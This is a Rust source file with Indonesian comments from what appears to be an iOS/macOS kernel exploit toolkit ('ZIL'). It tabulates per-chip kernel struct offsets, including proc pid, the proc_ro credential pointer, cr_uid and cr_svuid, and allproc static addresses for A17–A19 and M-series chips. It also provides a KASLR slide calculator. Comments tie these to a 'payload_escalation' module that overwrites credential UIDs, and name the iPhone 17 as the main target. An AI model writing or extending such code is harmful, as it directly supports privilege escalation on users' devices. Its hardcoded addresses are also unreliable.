#![no_std]

use super::chip_detector::AppleChip;

/// Database offset statis per-chip untuk field kernel kritis.
/// Dirancang untuk forward-compatible: chip baru cukup tambah satu entry baru.
///
/// PENTING (xnu-12377.61.12): Sejak Darwin 25, p_ucred dipindah ke proc_ro.
/// proc_ucred() sekarang = p->p_proc_ro->p_ro_cred (two-hop indirection).
/// p_proc_ro selalu di 0x18 (struct invariant) — tidak disimpan di sini.
#[derive(Clone, Copy, Debug)]
pub struct StaticOffsets {
    /// Offset `p_pid` dalam struct `proc` (xnu-12377: 0x58, sebelumnya 0x60)
    pub proc_pid: u64,
    /// Offset `p_ro_cred` dalam struct `proc_ro`
    /// (ucred kini di proc->p_proc_ro[0x18]->p_ro_cred[X])
    pub proc_ro_ucred: u64,
    /// Offset `cr_uid` dalam struct `ucred`
    pub ucred_cr_uid: u64,
    /// Offset `cr_svuid` dalam struct `ucred` (saved UID)
    pub ucred_cr_svuid: u64,
    /// Offset `p_list` (linked list next pointer) dalam struct `proc`
    pub proc_p_list_next: u64,
    /// Alamat statis `allproc` sebelum KASLR
    pub allproc_static: u64,
    /// Alamat statis kernel base (pre-KASLR, untuk menghitung slide)
    pub kernel_base_static: u64,
}

impl StaticOffsets {
    /// Ambil database offset untuk chip yang diberikan.
    /// Return `None` jika chip tidak dikenal — gunakan heuristic scanning.
    pub fn for_chip(chip: AppleChip) -> Option<Self> {
        match chip {
            // ─────────────────────────────────────────────────────────
            // A17 Pro — iPhone 15 Pro (iOS 17.x / 18.x, xnu-10063~11000)
            // p_pid: 0x60 pada xnu-10063. proc_ro_ucred: 0x20 di proc_ro.
            // ─────────────────────────────────────────────────────────
            AppleChip::A17Pro => Some(Self {
                proc_pid:          0x60,  // xnu-10063 verified
                proc_ro_ucred:     0x20,  // p_ro_cred di proc_ro
                ucred_cr_uid:      0x18,
                ucred_cr_svuid:    0x1C,
                proc_p_list_next:  0x08,
                allproc_static:    0xFFFFFFF0079B4000,
                kernel_base_static: 0xFFFFFFF007004000,
            }),

            // ─────────────────────────────────────────────────────────
            // A18 — iPhone 16 (iOS 18.x, xnu-11215)
            // ─────────────────────────────────────────────────────────
            AppleChip::A18 => Some(Self {
                proc_pid:          0x60,  // xnu-11215 verified
                proc_ro_ucred:     0x20,
                ucred_cr_uid:      0x18,
                ucred_cr_svuid:    0x1C,
                proc_p_list_next:  0x08,
                allproc_static:    0xFFFFFFF007AB4000,
                kernel_base_static: 0xFFFFFFF007004000,
            }),

            // ─────────────────────────────────────────────────────────
            // A18 Pro — iPhone 16 Pro (iOS 18.x, xnu-11215)
            // ─────────────────────────────────────────────────────────
            AppleChip::A18Pro => Some(Self {
                proc_pid:          0x60,
                proc_ro_ucred:     0x20,
                ucred_cr_uid:      0x18,
                ucred_cr_svuid:    0x1C,
                proc_p_list_next:  0x08,
                allproc_static:    0xFFFFFFF007AB4000,
                kernel_base_static: 0xFFFFFFF007004000,
            }),

            // ─────────────────────────────────────────────────────────
            // A19 — iPhone 17 (iOS 19.x / Darwin 25, xnu-12377) — TARGET UTAMA ZIL
            // p_pid: 0x58 berdasarkan kalkulasi layout struct proc dari
            //   proc_internal.h (xnu-12377.61.12):
            //   lck_mtx_t ARM64 release = 8B → p_pid = 0x50 + 8 = 0x58
            // ─────────────────────────────────────────────────────────
            AppleChip::A19 | AppleChip::A19Pro => Some(Self {
                proc_pid:          0x58,  // DIVERIFIKASI dari proc_internal.h xnu-12377
                proc_ro_ucred:     0x20,  // p_ro_cred dari proc_ro
                ucred_cr_uid:      0x18,
                ucred_cr_svuid:    0x1C,
                proc_p_list_next:  0x08,
                allproc_static:    0xFFFFFFF007BB4000,
                kernel_base_static: 0xFFFFFFF007004000,
            }),

            // ─────────────────────────────────────────────────────────
            // A20 / A20 Pro / A21 — FORWARD COMPATIBILITY SLOTS
            // Offset belum diketahui — ZIL akan fallback ke heuristic scan.
            // ─────────────────────────────────────────────────────────
            AppleChip::A20 | AppleChip::A20Pro | AppleChip::A21 => None,

            // M-Series (iPad Pro / Mac, Darwin 25 = xnu-12377)
            AppleChip::M3 | AppleChip::M4 | AppleChip::M5 => Some(Self {
                proc_pid:          0x58,  // sama dengan A19 — Darwin 25
                proc_ro_ucred:     0x20,
                ucred_cr_uid:      0x18,
                ucred_cr_svuid:    0x1C,
                proc_p_list_next:  0x08,
                allproc_static:    0xFFFFFFF007BB4000,
                kernel_base_static: 0xFFFFFFF007004000,
            }),

            // Unknown — wajib pakai heuristic scan
            AppleChip::Unknown(_) => None,
        }
    }
}

impl StaticOffsets {
    // ─────────────────────────────────────────────────────────────────
    // ASSOCIATED CONSTANTS — Dipakai di payload_escalation.rs sebagai
    // nilai fallback linker-time ketika heuristic offset tidak tersedia.
    // ─────────────────────────────────────────────────────────────────

    /// Offset cr_uid dalam struct kauth_cred (A17~A19, xnu-10063~12377)
    /// Diverifikasi dari bsd/sys/ucred.h: posisi setelah semua header fields.
    pub const UCRED_CR_UID:   u64 = 0x18;

    /// Offset cr_svuid (saved UID) dalam struct kauth_cred
    pub const UCRED_CR_SVUID: u64 = 0x1C;

    /// Sentinel untuk head of allproc linked list (pre-KASLR).
    /// Ini adalah alamat `_allproc` di kernel Mach-O.
    /// Executor WAJIB apply kaslr_slide sebelum menggunakan nilai ini!
    /// Default: A19 Darwin 25. Chip lain lihat allproc_static per-chip.
    ///
    /// WARNING: Gunakan OffsetCalculator::slide() untuk konversi runtime addr.
    pub const PROC_LIST_HEAD: u64 = 0xFFFFFFF007BB4000;
}

/// Kalkulator KASLR — mengkonversi alamat statis ke alamat runtime.
pub struct OffsetCalculator {
    chip:        AppleChip,
    kaslr_slide: u64,
    offsets:     Option<StaticOffsets>,
}

impl OffsetCalculator {
    /// Buat kalkulator baru berdasarkan base kernel yang ditemukan Pathfinder.
    /// Deteksi chip dilakukan secara otomatis via MIDR_EL1.
    pub fn new(actual_kernel_base: u64) -> Self {
        let chip = AppleChip::detect();
        let offsets = StaticOffsets::for_chip(chip);

        // Hitung KASLR slide berdasarkan chip yang terdeteksi
        let static_base = offsets
            .map(|o| o.kernel_base_static)
            .unwrap_or(0xFFFFFFF007004000); // Default fallback

        let kaslr_slide = actual_kernel_base.wrapping_sub(static_base);

        Self { chip, kaslr_slide, offsets }
    }

    /// Konversi alamat statis (pre-KASLR) ke alamat runtime.
    pub fn slide(&self, static_addr: u64) -> u64 {
        static_addr.wrapping_add(self.kaslr_slide)
    }

    /// Apakah offset statis tersedia untuk chip ini?
    /// Jika false → Executor harus pakai HeuristicAnalyzer.
    pub fn has_static_offsets(&self) -> bool {
        self.offsets.is_some()
    }

    /// Ambil offset statis jika tersedia.
    pub fn get_offsets(&self) -> Option<&StaticOffsets> {
        self.offsets.as_ref()
    }

    /// Nama chip yang terdeteksi (untuk telemetri / debug).
    pub fn chip_name(&self) -> &'static str {
        self.chip.name()
    }

    /// KASLR slide yang dihitung.
    pub fn kaslr_slide(&self) -> u64 {
        self.kaslr_slide
    }
}
